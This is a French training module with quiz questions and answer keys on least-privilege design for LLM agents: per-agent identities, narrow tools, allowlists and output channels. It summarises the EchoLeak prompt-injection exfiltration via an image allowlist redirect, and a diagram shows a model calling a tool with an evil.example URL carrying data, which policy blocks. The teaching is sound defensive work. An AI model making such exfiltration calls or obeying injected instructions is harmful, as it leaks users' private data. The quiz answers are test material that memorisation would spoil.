---
id: "06-03"
titre: "Moindre privilège"
sous_rubriques:
  - id: par-agent
    titre: "Par agent"
  - id: par-outil
    titre: "Par outil"
sources:
  - titre: "OWASP — Top 10 for LLM Applications 2025, LLM06 Excessive Agency"
    url: "https://genai.owasp.org/llmrisk/llm062025-excessive-agency/"
  - titre: "Simon Willison — Breaking down EchoLeak, 11 juin 2025"
    url: "https://simonwillison.net/2025/Jun/11/echoleak/"
  - titre: "Simon Willison — The lethal trifecta for AI agents, 16 juin 2025"
    url: "https://simonwillison.net/2025/Jun/16/the-lethal-trifecta/"
qcm:
  - id: par-agent-1
    sous_rubrique: par-agent
    question: "OWASP appelle « Excessive Agency » le fait de donner trop de pouvoir à un agent. Quelles en sont les trois causes ?"
    choix:
      - "Trop de fonctionnalités, trop de permissions, trop d'autonomie"
      - "Trop de tokens, trop de latence, trop de coût"
      - "Trop d'utilisateurs, trop de serveurs, trop de logs"
      - "Trop de modèles, trop de langues, trop de prompts"
    reponse: 0
    pourquoi: >-
      Fonctionnalités : des outils dont la tâche n'a pas besoin.
      Permissions : des droits plus larges que nécessaire.
      Autonomie : des actions graves sans validation.
      Chacune agrandit les dégâts d'une injection.

  - id: par-agent-2
    sous_rubrique: par-agent
    question: "Quelle identité donner à un agent qui accède à tes systèmes ?"
    choix:
      - "Le jeton personnel du développeur qui l'a écrit"
      - "Le compte administrateur, pour éviter les blocages"
      - "Sa propre identité de service, avec ses propres droits, distincte de celle des développeurs"
      - "Le compte de l'utilisateur le plus ancien"
    reponse: 2
    pourquoi: >-
      Une identité propre se limite précisément.
      Elle se révoque sans gêner personne.
      Dans les logs, on sait que c'est l'agent qui a agi.
      Un jeton partagé mélange tout.

  - id: par-agent-3
    sous_rubrique: par-agent
    question: "L'agent agit pour le compte d'un utilisateur. Quels droits doit-il avoir ?"
    choix:
      - "Ceux de l'administrateur"
      - "Au plus ceux de l'utilisateur, et seulement ceux dont la tâche a besoin"
      - "La somme des droits de tous les utilisateurs"
      - "Aucun contrôle, c'est l'utilisateur qui demande"
    reponse: 1
    pourquoi: >-
      L'agent ne doit pas devenir un moyen de contourner les droits.
      Si l'utilisateur ne peut pas lire un dossier, l'agent non plus.
      Et pour résumer un ticket, il n'a pas besoin d'écrire.
      Intersection des deux : droits de l'utilisateur et besoin de la tâche.

  - id: par-agent-4
    sous_rubrique: par-agent
    question: "Pourquoi préférer des jetons d'accès à courte durée pour un agent ?"
    choix:
      - "Les modèles les préfèrent"
      - "Ils sont plus rapides"
      - "Ils coûtent moins cher"
      - "Un jeton volé ou mal utilisé expire vite"
    reponse: 3
    pourquoi: >-
      Un jeton peut fuiter dans un log ou une réponse.
      S'il expire dans quinze minutes, la fenêtre d'abus est courte.
      Un jeton permanent reste dangereux pour toujours.

  - id: par-agent-5
    sous_rubrique: par-agent
    question: "Un système a un agent qui lit le web et un agent qui accède aux données clients. Faut-il qu'ils aient les mêmes droits ?"
    choix:
      - "Oui, sinon ils ne peuvent pas collaborer"
      - "Oui, c'est plus simple"
      - "Non : chaque agent a seulement les droits de son rôle"
      - "Peu importe"
    reponse: 2
    pourquoi: >-
      L'agent web lit du contenu non fiable.
      S'il a aussi les données clients, une page piégée peut les atteindre.
      Séparer les droits sépare les risques.
      C'est une façon de casser le trio fatal.

  - id: par-outil-1
    sous_rubrique: par-outil
    question: "L'agent doit consulter des commandes. Quel outil lui donner ?"
    choix:
      - "lire_commande(id), en lecture seule"
      - "executer_sql(requete)"
      - "acces_base_complet()"
      - "shell(commande)"
    reponse: 0
    pourquoi: >-
      Un outil précis ne fait qu'une chose.
      executer_sql peut aussi effacer une table.
      shell peut tout faire.
      Le pouvoir de l'outil est le pouvoir de l'attaquant.

  - id: par-outil-2
    sous_rubrique: par-outil
    question: "Un outil « recuperer_page(url) » doit lire la documentation interne. Comment le restreindre ?"
    choix:
      - "Aucune restriction"
      - "Une consigne au modèle : « reste sur la doc interne »"
      - "Une liste blanche de domaines autorisés, vérifiée dans le code de l'outil"
      - "Un timeout plus court"
    reponse: 2
    pourquoi: >-
      Sans liste blanche, l'outil peut appeler n'importe quelle URL.
      Une injection peut y glisser des données privées.
      C'est un canal de sortie.
      La liste blanche ferme ce canal dans le code.

  - id: par-outil-3
    sous_rubrique: par-outil
    question: "Dans EchoLeak, la politique du navigateur n'autorisait que des images de domaines Microsoft. Pourquoi n'a-t-elle pas suffi ?"
    choix:
      - "Un domaine autorisé redirigeait vers n'importe quelle adresse"
      - "La politique était désactivée"
      - "Les images étaient en PDF"
      - "Copilot ignorait le navigateur"
    reponse: 0
    pourquoi: >-
      La liste blanche contenait un domaine trop large.
      Ce domaine acceptait de rediriger ailleurs.
      L'attaquant passait par lui pour atteindre son serveur.
      Une liste blanche ne vaut que par le domaine le plus permissif qu'elle contient.

  - id: par-outil-4
    sous_rubrique: par-outil
    question: "Pourquoi séparer « lire_fichier » et « ecrire_fichier » en deux outils ?"
    choix:
      - "Pour ralentir l'agent"
      - "Pour avoir plus d'outils"
      - "Parce que JSON l'impose"
      - "On peut donner l'un sans l'autre, et exiger une validation seulement pour l'écriture"
    reponse: 3
    pourquoi: >-
      Beaucoup de tâches ne font que lire.
      Un outil qui lit et écrit force à donner les deux.
      Séparés, on accorde juste ce qu'il faut.
      Et la validation humaine se concentre sur l'écriture.

  - id: par-outil-5
    sous_rubrique: par-outil
    question: "Un outil d'envoi d'e-mail est nécessaire. Quelle limite ajouter dans son code ?"
    choix:
      - "Aucune, l'e-mail est inoffensif"
      - "Destinataires limités (domaine interne ou liste), quota par heure, validation pour l'externe"
      - "Une limite de 10 caractères"
      - "Une consigne dans la description de l'outil"
    reponse: 1
    pourquoi: >-
      L'e-mail est un canal de sortie.
      Limiter les destinataires empêche d'écrire à l'attaquant.
      Le quota limite les dégâts d'une boucle ou d'un abus.
      La description, le modèle peut l'ignorer. Le code, non.

  - id: par-outil-6
    sous_rubrique: par-outil
    question: "Les outils exposés à l'agent doivent-ils être les mêmes pour toutes les tâches ?"
    choix:
      - "Peu importe"
      - "Oui, toujours tous"
      - "Oui, c'est plus simple pour le modèle"
      - "Non : on expose seulement les outils utiles à la tâche en cours"
    reponse: 3
    pourquoi: >-
      Un outil absent ne peut pas être détourné.
      Une tâche de résumé n'a pas besoin d'envoyer des e-mails.
      Moins d'outils, c'est aussi moins de confusion pour le modèle.
---

## Par agent {#par-agent}

Le **moindre privilège** : chaque agent n'a que les droits dont sa tâche a besoin.

OWASP appelle le contraire « Excessive Agency ». Trois excès :

| Excès | Exemple |
|---|---|
| Fonctionnalités | Un agent de résumé qui peut aussi envoyer des mails |
| Permissions | Un jeton qui écrit alors que l'agent ne fait que lire |
| Autonomie | Un virement sans validation humaine |

:::pourquoi
Une injection fait ce que l'agent peut faire.
Moins il peut, moins elle fait de dégâts.
:::

Chaque agent a sa **propre identité**. Pas le compte d'un développeur, pas un compte administrateur.

:::pourquoi
Une identité propre se limite, se révoque, se trace.
Un jeton partagé mélange les responsabilités.
:::

Quand il agit pour un utilisateur : au plus **les droits de cet utilisateur**, réduits au **besoin de la tâche**.

```mermaid
flowchart LR
  U["Droits de l'utilisateur"] --> I{"Intersection"}
  T["Besoin de la tâche"] --> I
  I --> A["Droits effectifs de l'agent"]
```

:::pourquoi
L'agent ne doit pas servir à contourner les droits.
Et l'utilisateur n'a pas besoin de tous ses droits pour cette tâche.
:::

Des jetons **à courte durée**.

:::pourquoi
Un jeton fuité qui expire dans quinze minutes fait peu de dégâts.
:::

Dans un système multi-agent, chaque rôle a ses droits.

:::pourquoi
L'agent qui lit le web ne doit pas avoir accès aux données clients.
Séparer les droits casse le trio fatal.
:::

## Par outil {#par-outil}

Chaque outil est une porte. On la fait la plus étroite possible.

| Plutôt que | Préférer |
|---|---|
| `executer_sql(requete)` | `lire_commande(id)` |
| `fichier(action, chemin)` | `lire_fichier(chemin)` et `ecrire_fichier(chemin)` séparés |
| `http(url)` | `recuperer_doc(url)` avec liste blanche de domaines |
| `envoyer_mail(dest)` | Destinataires limités, quota, validation pour l'externe |

:::pourquoi
Le pouvoir d'un outil est le pouvoir d'un attaquant qui le pilote.
Un outil étroit se valide et se surveille facilement.
:::

Les restrictions vivent dans le **code de l'outil**, pas dans sa description.

:::pourquoi
Le modèle peut ignorer une description.
Il ne peut pas contourner un `if` dans le code.
:::

Surveille tous les **canaux de sortie** : e-mail, requêtes HTTP, images, liens.

:::pourquoi
Dans EchoLeak, une simple image servait de canal.
La liste blanche d'images contenait un domaine qui redirigeait ailleurs.
Une liste blanche vaut ce que vaut son domaine le plus permissif.
:::

N'expose que les outils de la **tâche en cours**.

:::pourquoi
Un outil absent ne peut pas être détourné.
:::

```mermaid
sequenceDiagram
  participant L as Modèle
  participant O as Orchestrateur
  participant P as Politique d'accès
  participant T as Outil
  L->>O: recuperer_doc(url=https://evil.example/?d=...)
  O->>P: Cet agent, cet outil, cet argument ?
  P-->>O: Refusé : domaine hors liste blanche
  O-->>L: Refusé : seuls les domaines internes sont autorisés
  Note over O,T: L'appel n'atteint jamais l'outil
```

## À retenir

- Pas de fonctionnalités, de permissions ni d'autonomie en trop.
- Une identité par agent. Droits = droits de l'utilisateur ∩ besoin de la tâche.
- Jetons courts. Rôles séparés en multi-agent.
- Outils étroits, restrictions dans le code, canaux de sortie surveillés.
